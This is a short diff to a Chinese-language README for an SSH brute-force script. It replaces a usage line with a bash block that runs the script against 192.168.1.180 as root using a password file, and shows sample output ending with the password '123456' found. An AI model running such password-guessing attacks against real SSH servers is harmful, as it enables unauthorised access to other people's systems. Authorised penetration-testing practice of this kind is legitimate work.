@@ -33,5 +33,15 @@ optional arguments:
 
 #### 执行脚本
 
-`python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10`
+```Bash
+# python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
+[-] 11 is not correct
+[-] 44 is not correct
+[-] 88 is not correct
+[-] 55 is not correct
+[-] 22 is not correct
+[-] 77 is not correct
+[+] 123456 is correct
+SSH PassWord：123456
+```
 
